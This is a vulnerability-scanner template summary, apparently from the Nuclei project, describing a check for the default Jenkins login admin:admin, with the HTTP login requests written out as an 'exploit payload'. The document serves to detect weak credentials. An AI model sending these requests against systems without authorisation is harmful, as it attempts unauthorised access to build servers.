# Nuclei Template: Jenkins Default Login
**Template ID:** jenkins-weak-password
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`jenkins-default.yaml`)

## Vulnerability Information & PoC

## Description
Jenkins credentials of admin:admin were discovered.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

POST /j_spring_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

j_username=admin&j_password=admin&from=%2F&Submit=Sign+in

GET / HTTP/1.1
Host: {{Hostname}}
```

